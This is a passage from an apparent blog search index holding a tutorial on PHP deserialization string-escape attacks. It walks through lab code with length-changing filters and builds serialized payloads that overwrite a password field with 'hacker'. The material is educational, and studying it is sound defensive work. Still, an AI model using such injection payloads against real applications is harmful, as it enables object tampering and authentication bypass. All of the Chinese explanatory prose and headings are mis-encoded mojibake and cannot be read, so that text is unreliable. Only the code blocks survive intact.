$pass=&#39;123456&#39;;&#125;</code></pre><p>æ„é€ é¡ºåºï¼Œä»</p><pre><code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</code></pre><p>å¼€å§‹è®¡ç®—</p><pre><code>// å¾—çŸ¥ å°‘å˜å¤š bb-&gt;ccc ï¼Œè¢«ç¯¡æ”¹çš„sé•¿åº¦è¦å¤§ï¼Œså†…å®¹è¦å°ï¼Œæ‰èƒ½é¡¶å‡º// æ•°å‡º`&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;`éƒ¨åˆ†æ˜¯27é•¿åº¦å­—ç¬¦ï¼Œåˆ™éœ€è¦é¡¶å‡º27// é¡¶å‡ºé•¿åº¦/å˜é•¿ä½æ•° å°±æ˜¯ è¢«æ›¿æ¢å­—ç¬¦ çš„ä¸ªæ•°// æ•…è¾“å‡º27å¯¹&quot;bb&quot;</code></pre><p>// â€œ;s:4:â€passâ€;s:6:â€hackerâ€;}     len:27</p><p>// 2-&gt;3 å·®å€¼1   27å¯¹</p><pre><code>$payload = &#39;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;&#39;;echo $payload;echo &quot;\n&quot;;$payload=filter($payload);echo $payload;echo &quot;\n&quot;;$o=unserialize($payload);// echo $o-&gt;pass;echo serialize($o);?&gt;</code></pre><h3 id="åšæ³•"><a href="#åšæ³•" class="headerlink" title="åšæ³•"></a>åšæ³•</h3><h5 id="1-ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²"><a href="#1-ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²" class="headerlink" title="1 ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²"></a>1 ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²</h5><pre><code>&lt;?php// expclass A&#123;    public $name=&#39;12&#39;;    public $pass=&#39;21&#39;;&#125;$o = new A();echo serialize($o);?&gt;</code></pre><p>å¾—åˆ°</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;12&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;</code></pre><h5 id="2-æ„é€ æœ€ç»ˆçš„passå€¼"><a href="#2-æ„é€ æœ€ç»ˆçš„passå€¼" class="headerlink" title="2 æ„é€ æœ€ç»ˆçš„passå€¼"></a>2 æ„é€ æœ€ç»ˆçš„passå€¼</h5><p>å› ä¸ºæˆ‘ä»¬æ„é€ çš„è¿™éƒ¨åˆ†ä»£ç ä¼šè¢«â€œå°‘å˜å¤šâ€é¡¶å‡ºå»ï¼Œå› æ­¤æˆ‘ä»¬ä»è¢«æ„é€ å˜é‡çš„ä¸Šä¸€ä¸ªå˜é‡çš„å˜é‡å€¼çš„å³å¼•å·èµ·å¼€å§‹æ„é€ ï¼Œæ„é€ å¦‚ä¸‹è¿™éƒ¨åˆ†</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;12&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;</code></pre><p>æ„é€ ä¸º</p><pre><code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code></pre><h5 id="3-è®¡ç®—æº¢å‡ºä½ç§»ï¼Œæ„é€ payload"><a href="#3-è®¡ç®—æº¢å‡ºä½ç§»ï¼Œæ„é€ payload" class="headerlink" title="3 è®¡ç®—æº¢å‡ºä½ç§»ï¼Œæ„é€ payload"></a>3 è®¡ç®—æº¢å‡ºä½ç§»ï¼Œæ„é€ payload</h5><p>ä»ä¸Šä¸€æ­¥å·²æ„é€ å¾—åˆ°</p><pre><code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code></pre><p>ä½¿ç”¨pythonè®¡ç®—é•¿åº¦ len(â€˜â€œ;s:4:â€passâ€;s:6:â€hackerâ€;}â€™)ï¼Œå¾—å…¶é•¿åº¦ä¸º27</p><p>å·²çŸ¥é¢˜ç›®æ˜¯â€™bbâ€™ å˜ä¸º â€˜cccâ€™ï¼Œå³ 2-&gt;3ï¼Œä¸€å¯¹çš„é•¿åº¦å·®å€¼å¤š1ä¸ªå­—èŠ‚ã€‚ä¸ºäº†é¡¶å‡º 27é•¿åº¦ çš„payloadï¼Œæˆ‘ä»¬åˆ™ 27/1 == 27 ï¼Œå³æ„é€ 27å¯¹ â€˜bbâ€™ å˜ â€˜cccâ€™</p><p>ä»ç¬¬ä¸€æ­¥å¾—åˆ°çš„å­—ç¬¦ä¸²ï¼Œç›´æ¥åˆ é™¤nameçš„å˜é‡å€¼ä¸­åŸæœ‰å­—ç¬¦ä¸²ï¼ˆå³åŸæœ‰çš„â€œ12â€è¿™ç§å ä½å­—ç¬¦ï¼‰ï¼Œå¡«å†™27å¯¹â€™bbâ€™ï¼ˆå³54ä¸ªbï¼‰å’Œæˆ‘ä»¬æ„é€ åçš„payload</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;</code></pre><p>å¦‚ä¸Špayloadï¼Œé»„åº•çº¢å­—æ˜¯æˆ‘ä»¬æ‹¼ä¸Šå»çš„ï¼Œç°åº•ç´«å­—åœ¨æœªæ¥å°†ä¼šè¢«é¡¶å‡ºå»ï¼Œå®é™…ä½œåºŸã€‚</p><p>æœ€åä¸è¦å¿˜äº†ä¿®æ”¹nameå˜é‡å€¼çš„é•¿åº¦ï¼Œé¢˜ç›®ä¼šå°†è¿™27å¯¹bbæ›¿æ¢ä¸º27å¯¹cccï¼Œå³å˜ä¸º81ä¸ªé•¿åº¦çš„å­—ç¬¦å€¼ã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹å­—ç¬¦ä¸²é•¿åº¦ä¸º 81</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;</code></pre><p>ä¼ è¾“æ­¤å­—ç¬¦ä¸²ï¼Œåˆ™æˆåŠŸç»“æŸã€‚<br>å‘é€payloadï¼Œååºåˆ—åŒ–åçš„passå°†ä¼šæ˜¯ </p><pre><code>s:6:&quot;hacker&quot;</code></pre><p>æ¯”å¯¹å¦‚ä¸‹ï¼š</p><p><img src="/2022/07/09/code_audit/unserializationEscaping/2024-04-14-11-57-35.png" alt="2024-04-14-11-57-35"></p><h2 id="å¤šå˜å°‘"><a href="#å¤šå˜å°‘" class="headerlink" title="å¤šå˜å°‘"></a>å¤šå˜å°‘</h2><h5 id="å®éªŒä»£ç "><a href="#å®éªŒä»£ç " class="headerlink" title="å®éªŒä»£ç "></a>å®éªŒä»£ç </h5><pre><code>&lt;?php// å¤šå˜å°‘é¢˜ç›®function str_rep($string)&#123;    return preg_replace( &#39;/php|test/&#39;,&#39;&#39;, $string);&#125;class A&#123;    public $name=&#39;aaaa&#39;;    public $pass=&#39;123456&#39;;&#125;</code></pre><hr><pre><code>// å…ˆæ„é€ å°¾éƒ¨å­—ç¬¦ä¸²// &quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;&#125;  payloadéƒ¨åˆ†ï¼šè¿™æ˜¯æœ€ç»ˆè¦ååºåˆ—åŒ–è¯†åˆ«å‡ºæ¥çš„// &quot;;s:4:&quot;pass&quot;;s:2:&quot;222    ä½œåºŸéƒ¨åˆ†ï¼šè¿™éƒ¨åˆ†æ˜¯éœ€è¦è¢«åƒçš„ï¼Œä¸è¿‡è¿™éƒ¨åˆ†å¯ä»¥è®¡ç®—ï¼Œæ¯”å¦‚é•¿åº¦æ˜¯21ï¼Œæˆ–è€…ä¸æ˜¯æ•´å€æ•°ä¹Ÿå¯ä»¥ç›´æ¥æ”¹å­—ç¬¦ä¸²ä½¿å…¶é•¿åº¦æ˜¯å˜åŒ–é•¿åº¦çš„æ•´å€æ•°// å˜åŒ–ï¼š3-&gt;0æˆ–4-&gt;0ï¼Œå³æ‰¾3æˆ–è€…4çš„å€æ•°ï¼Œç„¶åæ„é€  21 / 3 = 7,åˆ™å†™7ä¸ªphp</code></pre><hr><pre><code>$payload = &#39;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:3:&quot;221&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;&#39;;echo &quot;\n&quot;;$payload=str_rep($payload);echo $payload;echo &quot;\n&quot;;$o=unserialize($payload);echo $o-&gt;pass;?&gt;</code></pre><h3 id="åšæ³•-1"><a href="#åšæ³•-1" class="headerlink" title="åšæ³•"></a>åšæ³•</h3><h5 id="1-ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²-1"><a href="#1-ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²-1" class="headerlink" title="1 ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²"></a>1 ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²</h5><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;12&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;</code></pre><h5 id="2-è®¡ç®—è¢«åƒæ‰éƒ¨åˆ†å­—ç¬¦ä¸²"><a href="#2-è®¡ç®—è¢«åƒæ‰éƒ¨åˆ†å­—ç¬¦ä¸²" class="headerlink" title="2 è®¡ç®—è¢«åƒæ‰éƒ¨åˆ†å­—ç¬¦ä¸²"></a>2 è®¡ç®—è¢«åƒæ‰éƒ¨åˆ†å­—ç¬¦ä¸²</h5><p>å¦‚è¿™éƒ¨åˆ†</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;12&quot;;s:4:&quot;pass&quot;;s:3:&quot;212&quot;;&#125;</code></pre><p><code>&quot;;s:4:&quot;pass&quot;;s:3:&quot;212</code><br>æ˜¯å°†è¢«åƒæ‰çš„éƒ¨åˆ†ï¼Œè®¡ç®—é•¿åº¦æ˜¯21</p><p>å˜åŒ–ï¼š3-&gt;0æˆ–4-&gt;0ï¼Œå³æ‰¾3æˆ–è€…4çš„å€æ•°ã€‚æ­¤å¤„å‡è®¾æˆ‘ä»¬é€‰æ‹©æ„é€ 3çš„å€æ•°ï¼Œåˆ™æ„é€  21 / 3 = 7,åˆ™å†™7ä¸ªphpã€‚</p><p>æ³¨æ„ï¼Œæ­¤å¤„å¦‚æœé•¿åº¦æ˜¯22ï¼Œä½†æ˜¯é‡åˆ°çš„é¢˜ç›®æ˜¯3-&gt;0ä½ç§»ä¸º3ï¼Œ22ä¸æ˜¯3çš„æ•´å€æ•°ï¼Œä¹Ÿä¸ç”¨å¤ªæ‹…å¿ƒã€‚â€œå¤šå˜å°‘â€é¢˜å‹æˆ‘ä»¬å¯ä»¥éšæ„æ§åˆ¶è¢«åƒçš„å­—ç¬¦ä¸²é•¿åº¦ï¼ˆåæ­£ä¼šè¢«åƒæ‰ï¼Œç”šè‡³ä¸ç”¨è®¡ç®—è¿™ä¸ªsçš„é•¿åº¦å¯¹ä¸å¯¹ï¼‰ï¼Œæ¯”å¦‚æ˜¯â€;s:4:â€passâ€;s:4:â€2221è¢«åƒçš„22é•¿åº¦ï¼Œé‚£å¯ä»¥æ”¹å­—ç¬¦ä¸²é•¿åº¦å’Œå­—ç¬¦ä¸²æ˜¯21é•¿åº¦çš„â€;s:4:â€passâ€;s:2:â€222</p><p>é‚£ä¹ˆpayloadç°åœ¨å°±æ˜¯â€;s:4:â€passâ€;s:3:â€212å°†ä¼šè¢«phpphpphpphpphpphpphpåƒæ‰ã€‚</p><p>payloadå¦‚ä¸‹</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:3:&quot;221</code></pre><h5 id="3-æ„é€ payloadæ‹¼æ¥å°¾éƒ¨"><a href="#3-æ„é€ payloadæ‹¼æ¥å°¾éƒ¨" class="headerlink" title="3 æ„é€ payloadæ‹¼æ¥å°¾éƒ¨"></a>3 æ„é€ payloadæ‹¼æ¥å°¾éƒ¨</h5><p>æ ¹æ®ä¸Šé¢æåˆ°çš„æ®‹ç¼ºï¼Œç›´æ¥æ„é€ payloadï¼Œæ‹¼æ¥å°¾éƒ¨æ„æˆå®Œæ•´çš„payloadå³å¯ã€‚</p><pre><code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;</code></pre><p>å˜ä¸º</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:3:&quot;221&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> code-audit </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
